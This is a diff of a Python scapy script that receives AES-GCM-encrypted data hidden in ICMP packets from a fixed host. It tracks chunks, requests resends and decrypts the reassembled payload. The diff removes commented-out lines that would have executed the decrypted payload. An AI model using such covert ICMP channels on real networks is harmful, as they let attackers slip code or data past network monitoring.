@@ -7,15 +7,20 @@ from scapy.all import *
 
 HOST_IP = "10.0.0.113"
 FILLER_STRING = b"\00"
-RESEND_MESSGE_ID = 9
+RESEND_MESSGE_CODE = 9
+CHUNK_MESSAGE_CODE = 3
+CONTROL_MESSAGE_CODE = 1
+FINISH_CODE = 2
 
 fil = f"src host {HOST_IP} and icmp"
+
 icmp_seq = 1
 data_received = {}
 complete_payload = ""
-total_chunks = 3
+total_chunks = -1
 chunks_recieved = set()
-expected_chunks = set(range(0, total_chunks))
+expected_chunks = set()
+
 start_checking = False
 
 with open("aes_key.bin", "rb") as key_file:
@@ -23,27 +28,44 @@ with open("aes_key.bin", "rb") as key_file:
 
 
 def handle_data_received(packet):
+    global total_chunks, start_checking, expected_chunks
     if packet[ICMP].type == 0:
         print(packet)
         return
-    global start_checking
     # data_received.append(packet[Raw].load.decode("unicode_escape"))
     if Raw not in packet:
         return
     packet_data = packet[Raw].load
-    start_checking = True
+    print(packet_data)
 
     # first occurance of filler string
-    headers, encrypted = packet_data.split(FILLER_STRING, 1)
+    try:
+        headers, encrypted = packet_data.split(FILLER_STRING, 1)
+    except:
+        # NO PADDING FOUND in packet_data
+        print("NO PADDING FOUND in packet_data")
+        return
     headers = headers.decode()
     message_type = int(headers[0])
-    chunk_index = int(headers[1:])
-    if message_type == 3:
+    if message_type == CHUNK_MESSAGE_CODE:
+        # make sure total_chunk initialized first
+        if total_chunks == -1:
+            return
+        chunk_index = int(headers[1:])
         data_received[chunk_index] = encrypted
         chunks_recieved.add(chunk_index)
+        print(message_type, chunk_index)
+        print(headers, encrypted)
+    elif message_type == CONTROL_MESSAGE_CODE:
+        total_chunks = int(headers[1:])
+        print("total ch", total_chunks)
+        expected_chunks = set(range(0, total_chunks))
+        print("recieved code 1", total_chunks)
+    elif message_type == FINISH_CODE:
+        print("Starting checking")
+        start_checking = True
+        return
 
-    print(message_type, chunk_index)
-    print(headers, encrypted)
     # decrypted_data = decrypt_chunk(packet_data)
 
     # data_received.append(packet[Raw].load)
@@ -57,7 +79,7 @@ def send_recover(missing: set[int]):
     # seq increments per sent packet, helps detect packet loss, track individual requests
 
     for chunk_index in missing:
-        payload = f"{RESEND_MESSGE_ID}{chunk_index}"
+        payload = f"{RESEND_MESSGE_CODE}{chunk_index}"
 
         icmp_packet = (IP(dst=HOST_IP) / ICMP(id=icmp_id, seq=icmp_seq) /
                        Raw(load=payload.encode()))
@@ -72,17 +94,18 @@ def send_recover(missing: set[int]):
             return None
 
 
-def decrypt_chunk(chunk: bytes) -> bytes:
+def decrypt_payload():
+    sorted_chunks = dict(sorted(data_received.items()))
+    payload_list = [chunk for chunk in sorted_chunks.values()]
+    encrypted_data = b"".join(payload_list)
+    print("payload list", payload_list)
+    print("encrypted data:", encrypted_data)
+    sleep(100)
     aesgcm = AESGCM(symkey)
-    # extract nonce and ciphertext
-    cipehertext = b"".join(data_received)
-    nonce = cipehertext[:12]
-    enc_text = cipehertext[12:]
-
-    print(cipehertext)
-    # decrypt
-    decrypted = aesgcm.decrypt(nonce, enc_text, associated_data=None)
-    return decrypted
+    nonce = encrypted_data[:12]
+    ciphertext = encrypted_data[12:]
+    plaintext = aesgcm.decrypt(nonce, ciphertext, associated_data=None)
+    return plaintext.decode()
 
 
 stop_sniffing = False
@@ -100,7 +123,7 @@ sniffer_thread.start()
 while True:
     sleep(1)
 
-    if start_checking:
+    if start_checking and total_chunks != -1:
         missing = expected_chunks - chunks_recieved
         if missing:
             print("Missing chunks:", missing)
@@ -110,7 +133,5 @@ while True:
             stop_sniffing = True
             break
 
-# decrypted = decrypt_chunk(data_received[0])
-# exec(decrypted.decode())
-
-# exec("".join(data_received))
+total_payload = decrypt_payload()
+print(total_payload)
